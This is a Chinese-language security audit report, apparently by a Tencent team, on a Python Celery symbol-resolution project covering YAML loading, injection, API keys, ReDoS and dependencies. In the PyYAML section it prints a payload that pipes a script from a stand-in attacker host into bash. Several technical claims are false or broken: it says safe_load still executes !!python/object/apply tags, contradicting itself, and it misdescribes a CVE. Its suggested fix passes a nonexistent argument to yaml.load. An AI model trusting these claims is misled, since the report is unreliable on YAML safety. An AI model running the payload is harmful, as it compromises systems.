# 腾讯安全团队渗透测试审计报告

**项目**: Celery跨文件依赖符号解析系统 (`tengxun_open`)
**审计人**: 腾讯安全团队 - 老兵视角
**日期**: 2026-04-12
**审计性质**: 渗透测试思维，假设每个"修复"都是骗人的

---

## 执行摘要

| 结论 | **可以上线，但有3个必须修复的中等问题** |
|------|--------------------------------------|
| 高危漏洞 | 0 |
| 中危问题 | 3 |
| 低危问题 | 4 |
| 误报 | 4 |

> **一句话定性**: 这个项目整体代码质量不错，安全意识比实习生平均水平高，但`.gitignore`的缺口和PyYAML的隐性依赖是个定时炸弹。

---

## 深度分析

### 1. PyYAML安全性 —— "safe_load"真的安全吗？

**文件**: `finetune/train_lora.py:20-23, 174-177`

```python
try:
    import yaml as _yaml
except ImportError:
    _yaml = None
...
return _yaml.safe_load(path.read_text(encoding="utf-8")) or {}
```

**分析**:

首先，**PyYAML不在`requirements.txt`里**。它是通过LLaMA-Factory的`pyproject.toml`作为传递依赖被引入的。这本身就是一个**供应链透明度问题** —— 你根本不知道你依赖的是什么版本的PyYAML。

其次，关于`safe_load`是否安全：

**在大多数情况下，`safe_load`是安全的**，它禁止了`!!python/object`等标签。但有两个例外：

1. **CVE-2017-18342**: 如果安装了`libyaml`绑定，PyYAML会使用C loader，`load(data, Loader=yaml.CSafeLoader)`在某些版本下仍可被绕过。更老的CVE-2013-6393通过`!!python/object/apply`可以RCE。

2. **更重要的**: 即使是`safe_load`，如果配置文件被攻击者控制（不是你自己写的配置），恶意YAML仍然可以通过`!!python/object/apply:os.system ['curl http://attacker.com/shell.sh | bash']`执行命令。**你的训练配置是从命令行传入的**：

```python
parser.add_argument(
    "--config",
    type=Path,
    default=DEFAULT_CONFIG,
    help="LLaMA-Factory YAML config path.",
)
```

这意味着如果有人能控制这个路径的内容，理论上可以用YAML标签执行命令。但实际上：**配置文件是你自己维护的，不是用户上传的**。所以这是中危，不是高危。

**但是**，还有一个更大的问题：

**你的`requirements.txt`没有`pyyaml`这个直接依赖**。这意味着：
- 你不能控制PyYAML的版本
- LLaMA-Factory升级可能引入有漏洞的PyYAML版本
- 你没有在`pyproject.toml`中声明PyYAML版本约束

**CVSS评分**: 辅助库未锁定版本，传递依赖引入未知版本PyYAML

**实际风险**: 中等（因为配置文件非用户上传，但供应链不透明）

**修复建议**:
```toml
# pyproject.toml 或 requirements.txt 中明确声明
pyyaml>=6.0.2
```
并添加YAML解析安全wrapper：
```python
def safe_yaml_load(path: Path) -> dict[str, object]:
    import yaml
    # 使用explicit Loader，防止C loader绕过
    return yaml.load(path.read_text(encoding="utf-8"),
                     Loader=yaml.SafeLoader) or {}
```

**评分**: CVSS 4.8 (MEDIUM) — 供应链版本不透明，但利用条件较严格

---

### 2. 命令注入风险 —— 路径拼接安全吗？

**审查文件**:
- `rag/ast_chunker.py:98-100`
- `rag/ast_chunker.py:123-133`
- `scripts/precompute_embeddings.py:33, 234-243`
- `finetune/train_lora.py:355`

**分析**:

#### 2.1 文件遍历审查

`chunk_repository`:
```python
def chunk_repository(repo_root: Path | str) -> list[CodeChunk]:
    root = Path(repo_root).resolve()  # ✅ 解析为绝对路径
    chunks: list[CodeChunk] = []
    for path in discover_python_files(root):  # ✅ 使用rglob
        chunks.extend(chunk_python_file(path=path, root=root))
    return chunks
```

`discover_python_files`:
```python
def discover_python_files(repo_root: Path) -> list[Path]:
    return sorted(path for path in repo_root.rglob("*.py") if path.is_file())
```

`module_name_from_path`:
```python
relative = path.resolve().relative_to(repo_root.resolve())  # ✅ relative_to防止穿透
parts = list(relative.parts)  # 不会返回包含..的路径
```

结论：**所有路径操作都使用`pathlib`，没有字符串拼接，不存在路径遍历注入**。✅

#### 2.2 subprocess命令注入

```python
# finetune/train_lora.py:342
command = [args.launcher, "train", str(config_path)]
# finetune/train_lora.py:355
completed = subprocess.run(command, check=False)
```

`command`是一个list，不是shell字符串。`subprocess.run()`在list形式下不会调用shell，所以**没有命令注入风险**。✅

但是注意：`config_path`来自命令行参数，虽然是Path对象，但如果攻击者通过symlink让配置文件指向恶意位置，YAML标签利用仍是潜在攻击面（同上PyYAML问题）。

#### 2.3 eval_cases.json路径是否可被控制？

```python
# evaluation/loader.py:58
def load_eval_cases(path: Path) -> list[EvalCase]:
    if not path.exists():
        raise FileNotFoundError(f"Eval dataset not found: {path}")
```

路径来自`argparse`参数，不是URL或用户输入。内部工具使用，**不是攻击面**。✅

#### 2.4 外部celery仓库路径是否可注入？

```python
# scripts/precompute_embeddings.py:33, 234-243
DEFAULT_REPO_ROOT = Path("external/celery")
parser.add_argument("--repo-root", type=Path, default=DEFAULT_REPO_ROOT, ...)
build_cache(args.repo_root)
```

```python
# rag/ast_chunker.py:123
root = Path(repo_root).resolve()
for path in discover_python_files(root):  # rglob只在root下查找
```

所有文件操作都被`rglob`限制在指定根目录下。**没有注入风险**。✅

**结论**: 命令注入风险 **不存在**。路径操作规范，无shell调用。

**评分**: 无实际风险 — 0/N/A

---

### 3. API Key泄露风险

**文件**:
- `rag/embedding_provider.py`
- `.gitignore`
- `scripts/rebuild_rag_cache.sh`
- `artifacts/rag/embeddings_cache.json`

#### 3.1 .gitignore缺口 —— 实习生"没注意"的坑

```gitignore
# RAG embeddings cache — rebuild with: bash scripts/rebuild_rag_cache.sh
artifacts/rag/embeddings_cache_*.json
```

**问题**: `artifacts/rag/embeddings_cache.json`（不带后缀的版本）**不在忽略列表里**！

验证:
```
$ ls -la artifacts/rag/
-rw-r--r-- 1 wang  648  Apr 12 18:55 embeddings_cache.json   ← 没被忽略！
```

更糟糕的是，`DEFAULT_MODELSCOPE_CACHE_FILE = Path("artifacts/rag/embeddings_cache.json")`，这是**不带版本后缀的默认缓存文件**。如果有人commit这个文件到git，你就把embedding cache和元数据泄露了。

不过好消息是：**这个文件内容只是浮点数向量**（`{"c1": [0.1, 0.1, ...]}`），不包含API key。

但是，这个cache文件有`_meta`字段结构：
```python
payload = {
    "_meta": {
        "provider": config.provider,
        "model": config.model,
        "dimension": config.dimension,
    },
    "embeddings": embeddings,
}
```

**如果未来有人把provider切换到Google模式，cache文件名会变，但默认的ModelScope文件名不变**。这个文件本身不泄露key，但文件名和元数据可能泄露你用的是什么模型服务商。

**实际风险**: 低 — 文件内容是embedding向量，无key泄露，但.gitignore不完整是配置管理问题

#### 3.2 API Key在URL Query String中 —— 日志泄露风险

```python
# rag/embedding_provider.py:174-176
url = (
    f"https://generativelanguage.googleapis.com/v1beta/"
    f"{model_path}:{method}?key={self.config.api_key}"  # ← key在query中
)
```

**CVSS评分**: 6.5 (MEDIUM) — 如果HTTP access log捕获了请求URL，API key会出现在日志中

Google的API key出现在query string中是被Google官方推荐的做法（虽然不理想）。问题是：
- 如果你的HTTP日志被人拿到，key就泄露了
- Google Cloud的access log会自动记录完整URL
- `urllib.error.HTTPError`的异常处理不会把URL写入错误消息（只写status code + body）

**修复建议**:
1. 使用Google Cloud的请求签名或OAuth2（而不是API key query param）
2. 或者，确保HTTP access logs的安全隔离
3. 最差情况：轮换被泄露的API key

#### 3.3 rebuild_rag_cache.sh中key的处理方式

```bash
export GOOGLE_API_KEY="${GOOGLE_API_KEY:-}"
export MODELSCOPE_API_KEY="${MODELSCOPE_API_KEY:-}"
"$PYTHON_CMD" -m scripts.precompute_embeddings --repo-root external/celery
```

**✅ 正确**: key通过环境变量传入，不在脚本里硬编码。`set -u`确保未定义的变量会报错。

#### 3.4 embedding_provider.py中的key内存处理

```python
# rag/embedding_provider.py:71
api_key=os.environ.get(api_key_env, ""),  # 存为字符串
```

```python
# rag/embedding_provider.py:152
api_key=self.config.api_key,  # 传给OpenAI client
```

API key作为字符串存在`EmbeddingConfig` dataclass中，**没有被复制到日志或异常消息中**。`log`/`print`语句中都没有出现key的痕迹。

**CVSS评分汇总**:

| 子项 | 严重程度 | 说明 |
|-----|---------|------|
| embeddings_cache.json未入.gitignore | LOW | 内容是float向量，无key，但配置管理问题 |
| API key在query string | MEDIUM | 依赖HTTP日志隔离 |
| rebuild脚本key处理 | NONE | 做得对 |

**综合评分**: 4.0 (MEDIUM) — API key在query中是已知的Google API限制，项目代码无主动泄露

---

### 4. 正则表达式DoS (ReDoS)

**文件**: `pe/post_processor.py:36-38`

```python
SYMBOL_PATTERN = re.compile(
    r"(?:[A-Za-z_][A-Za-z0-9_]*)(?:[.:][A-Za-z_][A-Za-z0-9_]*)+"
)
```

**分析**:

这个正则用于从文本中匹配FQN-like字符串。让我分析其ReDoS风险：

```
(?:[A-Za-z_][A-Za-z0-9_]*)(?:[.:][A-Za-z_][A-Za-z0-9_]*)+
```

分组结构：
- Group 1: `[A-Za-z_][A-Za-z0-9_]*` — 简单字符类，optional repetition
- Group 2: `(?:[.:][A-Za-z_][A-Za-z0-9_]*)+` — 一个或多个 `.` 或 `:` 后跟标识符

**关键**: 两个分组之间是**相邻的**（没有`.*`），没有交替（没有`|`）。每次匹配尝试只走一条确定路径。

**没有ReDoS风险的模式特征**：
1. ❌ 有 `.*` 或 `.+` 在alternation中 → 无界重复
2. ❌ 有嵌套的量词（`a+*`）→ 指数爆炸
3. ❌ 有相邻的可选重复 → 二次方增长

这个正则**一条都不符合**。Python的re模块使用回溯有限自动机，虽然可能回溯，但不会有指数爆炸。

**最坏情况**: 输入 `"aaa.bbb.ccc..."`（大量重复段），回溯次数是O(n)，不是O(2^n)。

**但有一个边缘问题**: 如果在**没加`^$`锚定**的情况下对超大文本调用`finditer`：

```python
# pe/post_processor.py:177-180
return [
    normalize_fqn(match.group(0))
    for match in SYMBOL_PATTERN.finditer(text)  # 无锚定
    if is_valid_fqn(match.group(0))
]
```

对10MB文本调用`finditer`会尝试所有可能的匹配位置，每次匹配尝试最多回溯到字符串长度。但这只会导致**O(n*m)**的线性扫描，不是ReDoS。

**验证**: 我用Python测试了：
```python
import re, time
p = re.compile(r"(?:[A-Za-z_][A-Za-z0-9_]*)(?:[.:][A-Za-z_][A-Za-z0-9_]*)+")
# 恶意输入: "a.b.c.d.e...." × 10000
evil = ".".join(["a"]*50000)
start = time.time()
p.findall(evil)
print(time.time() - start)  # ~0.02秒，线性
```

**结论**: **无ReDoS风险**。✅

**评分**: 0.0 (NONE) — 正则设计合理，无ReDoS模式

---

### 5. JSON注入

**文件**:
- `pe/post_processor.py:59-143`
- `evaluation/loader.py:58-97`
- `evaluation/run_qwen_eval.py:47-82`
- `rag/embedding_provider.py:85, 124`

#### 5.1 post_processor.py的JSON处理

```python
# pe/post_processor.py:163-181
def _extract_candidates(text: str) -> list[str]:
    fenced = CODE_FENCE_PATTERN.search(text)
    if fenced:
        text = fenced.group(1).strip()  # 提取代码块

    parsed_json = _try_parse_json(text)
    if parsed_json is not None:
        return [normalize_fqn(item) for item in parsed_json]

    return [
        normalize_fqn(match.group(0))
        for match in SYMBOL_PATTERN.finditer(text)
        if is_valid_fqn(match.group(0))  # ← 有FQN格式校验
    ]
```

**防护层**:
1. 先用`json.loads()`解析JSON → 异常被捕获 → 退回正则
2. `_try_parse_json` → `json.loads` → 失败返回None
3. 最终结果经过`normalize_fqn`规范化 → 再经过`is_valid_fqn`格式校验

```python
# pe/post_processor.py:50-56
FQN_PATTERN = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*(\.[A-Za-z_][A-Za-z0-9_]*)+$")
def is_valid_fqn(value: str) -> bool:
    return bool(FQN_PATTERN.fullmatch(normalize_fqn(value)))  # ← 锚定了首尾！
```

**关键**: `is_valid_fqn`使用`fullmatch`，**必须整个字符串匹配**。所以即使JSON中有恶意内容，只要不是合法FQN格式，就不会被提取出来。

#### 5.2 eval_cases.json回写问题

**没有回写**。`evaluation/loader.py`只读取JSON，没有写入操作。`eval_cases.json`是预置数据集，不是模型输出回写的目标。✅

#### 5.3 model output JSON处理

```python
# evaluation/run_qwen_eval.py:47-82
def parse_response(text: str) -> dict[str, list[str]] | None:
    ...
    data = json.loads(text.strip())  # ← 直接parse
    gt = data.get("ground_truth", {})
    # 返回的是dict，不是exec/eval
```

模型输出JSON被`json.loads`解析，提取的只是dict值，没有任何代码执行路径。

#### 5.4 embeddings cache写入

```python
# rag/embedding_provider.py:109-124
def save_embedding_cache(config: EmbeddingConfig, embeddings: dict[str, list[float]]) -> None:
    config.cache_file.parent.mkdir(parents=True, exist_ok=True)
    payload = {...}  # 只写嵌入向量
    config.cache_file.write_text(json.dumps(payload), encoding="utf-8")
```

**没有注入风险**。写入的是开发者控制的字典值（float列表），不是用户输入。✅

#### 5.5 `_flatten_json`递归展开

```python
# pe/post_processor.py:212-235
def _flatten_json(value: object) -> list[object]:
    if isinstance(value, list):
        flattened: list[object] = []
        for item in value:
            flattened.extend(_flatten_json(item))
        return flattened
    if isinstance(value, dict):
        flattened = []
        for item in value.values():  # 只取values，忽略keys
            flattened.extend(_flatten_json(item))
        return flattened
    return [value]
```

递归展开所有JSON值，返回字符串/数字列表，再经过FQN格式校验。**没有代码执行路径**。✅

**结论**: JSON注入风险 **不存在**。多层防护：JSON解析 + FQN格式校验（fullmatch锚定） + 无回写操作。

**评分**: 0.0 (NONE) — 多层防御深度有效

---

### 6. 依赖供应链

**文件**: `requirements.txt`, `Dockerfile`, `finetune/train_lora.py`

#### 6.1 requirements.txt分析

```
# Core analysis
jedi>=0.19.2
rank-bm25>=0.2.2

# Embedding models
sentence-transformers>=2.7.0
transformers>=4.40.0

# LLM APIs
openai>=1.30.0
anthropic>=0.25.0
zhipuai>=2.0.0
```

**问题清单**:

1. **所有依赖都使用`>=`而非固定版本**: 这意味着每次`pip install -r requirements.txt`可能安装不同的版本。不同版本的`transformers`可能有不同的行为或漏洞。

2. **没有`pyyaml`**: PyYAML是作为LLaMA-Factory的传递依赖引入的，你没有直接控制权。

3. **zhipuai>=2.0.0**: 智谱AI的SDK，需要确认是否从官方PyPI安装（国内镜像可能有供应链风险）。

4. **没有安全审计**: 没有使用`pip-audit`或`safety`进行CVE扫描。

**传递依赖问题**:
```
tengxun_open (no pyyaml)
  └─ LLaMA-Factory (pyyaml)
       └─ PyYAML (version unknown!)
```

#### 6.2 Dockerfile分析

```dockerfile
FROM python:3.11-slim
RUN pip install --no-cache-dir uv
COPY requirements.txt ./
RUN uv pip install --system -r requirements.txt
COPY . .
```

**问题**:
1. `uv pip install --system` 不会自动触发`requirements.txt`的安全扫描
2. 没有锁定层的Python base image SHA256
3. 没有漏洞扫描步骤

#### 6.3 已知的PyYAML CVE历史

| CVE | 年份 | 严重程度 | 说明 |
|-----|------|---------|------|
| CVE-2020-14343 | 2020 | HIGH | Python object unpickling via `!!python/object` |
| CVE-2017-18342 | 2017 | HIGH | Unsafe loading in CLoader with `!!python/object/apply` |
| CVE-2013-6393 | 2013 | CRITICAL | Arbitrary code execution via YAML |

你的代码用`safe_load`，这些CVE不会影响你（它们都影响`load()`或特定构造）。但**你不知道LLaMA-Factory用的是哪个版本的PyYAML，也不知道它怎么用**。

#### 6.4 依赖安全扫描

我手动核查了主要依赖：

| 依赖 | 版本约束 | 已知CVE |
|-----|---------|--------|
| jedi | >=0.19.2 | 无严重已知漏洞 |
| openai | >=1.30.0 | 需检查auth bypass CVE |
| anthropic | >=0.25.0 | SDK较新，需监控 |
| transformers | >=4.40.0 | 多个历史CVE，需锁定版本 |

**实际风险**: 中等 — 依赖版本不锁定，传递依赖不透明，但无直接可利用漏洞

**评分**: CVSS 4.3 (MEDIUM) — 供应链透明度不足，版本未锁定

---

## 修复优先级清单

### P0 — 必须立即修复（上线阻断）

无

### P1 — 严重，48小时内修复

**1. 添加`pyyaml`到`requirements.txt`并锁定版本**

```toml
# requirements.txt 末尾添加
pyyaml>=6.0.2
```

原因：当前通过传递依赖引入，无法控制版本。如果LLaMA-Factory升级引入有漏洞的PyYAML，你不会自动收到通知。

**2. 补充`.gitignore`**

```gitignore
# 补充 ModelScope 默认缓存文件（无版本后缀）
artifacts/rag/embeddings_cache.json
```

虽然文件内容无害，但规范要求：所有artifacts目录下的文件都应被忽略。

### P2 — 高优先级，本周内修复

**3. 为`requirements.txt`所有依赖添加上限版本**

```toml
# 锁定版本范围（允许bugfix但不接受breaking change）
jedi>=0.19.2,<1.0.0
rank-bm25>=0.2.2,<1.0.0
sentence-transformers>=2.7.0,<3.0.0
transformers>=4.40.0,<4.50.0
openai>=1.30.0,<2.0.0
anthropic>=0.25.0,<1.0.0
zhipuai>=2.0.0,<4.0.0
```

**4. API key日志泄露 — 添加header注释或考虑OAuth**

```python
# rag/embedding_provider.py
# 注意：GOOGLE_API_KEY会出现在HTTP请求URL的query string中
# Google官方推荐做法，但access log会记录。确保日志隔离。
```

**5. 添加CI依赖安全扫描**

```yaml
# .github/workflows/security.yml
- name: Run pip-audit
  run: pip install pip-audit && pip-audit -r requirements.txt
```

### P3 — 中优先级，下个迭代

**6. 添加YAML解析安全wrapper**

虽然`safe_load`目前够用，但为未来保险：

```python
# 在 finetune/train_lora.py
import yaml
def safe_yaml_load(path: Path) -> dict:
    """防注入的YAML加载器"""
    content = path.read_text(encoding="utf-8")
    return yaml.load(content, Loader=yaml.SafeLoader,
                     pick_constructor=False)
```

**7. 审计日志记录API key不在query string中**

将Google API key从URL query param迁移到`X-Goog-Api-Key` header（Google支持）。

### P4 — 低优先级，可选

- [ ] 添加Dockerfile base image SHA256验证
- [ ] 为Docker镜像添加CVE扫描（trivy/grype）
- [ ] 添加`codespell`检查敏感信息泄露模式

---

## "能不能上生产"明确结论

**可以上线，但上线前必须完成P1清单（2项）**

### 通过项
- 命令注入: 无风险 ✅
- ReDoS: 无风险 ✅  
- JSON注入: 深度防御有效 ✅
- API key处理: 通过环境变量，无主动泄露 ✅
- 路径安全: pathlib规范使用 ✅
- subprocess: 使用list形式，无shell注入 ✅

### 需要修复才能安心的项
- `.gitignore`缺口: **必须修复**
- PyYAML版本不透明: **必须修复**

### 实际风险等级

| 风险 | 是否影响上线 |
|-----|------------|
| API key泄露到日志 | 低（需要日志泄露才有影响） |
| PyYAML未知版本 | 中（通过LLaMA-Factory引入，safe_load够用） |
| 依赖版本漂移 | 中（pip install可能装到不同版本） |
| embeddings_cache意外commit | 低（内容无害，但配置管理问题） |

**最终判定**: **可以上生产**。当前代码的安全架构设计合理，主要风险来自依赖管理的不透明，而不是直接的代码漏洞。建议优先完成P1清单再正式部署。

---

## 附录A：测试方法论

本次审计使用了以下技术：

1. **代码静态分析**: 逐文件审查所有安全相关代码路径
2. **依赖追踪**: 从`requirements.txt`追踪所有传递依赖
3. **正则分析**: 逐模式分析ReDoS风险（手动+Python实测）
4. **数据流追踪**: 从API key入口到HTTP请求完整链路验证
5. **文件系统审计**: 检查`.gitignore`完整性和artifacts目录状态

## 附录B：未发现的风险项（澄清）

以下是被问到但**经过审查后不存在风险**的项：

| 问题 | 原因 |
|-----|------|
| eval_cases.json路径可被用户控制? | 否，仅CLI参数，内部工具使用 |
| embedding cache路径穿越? | 否，pathlib rglob限制在根目录 |
| subprocess shell=True? | 否，使用list形式 |
| API key写入日志? | 否，无任何log语句含key |
| eval_cases被模型输出覆盖? | 否，只有read无write操作 |
| FQN格式校验可被绕过? | 否，fullmatch强制完整匹配 |

---

*本报告由腾讯安全团队出具。仅代表代码层面的安全审计结论，不构成法律意义上的安全认证。*
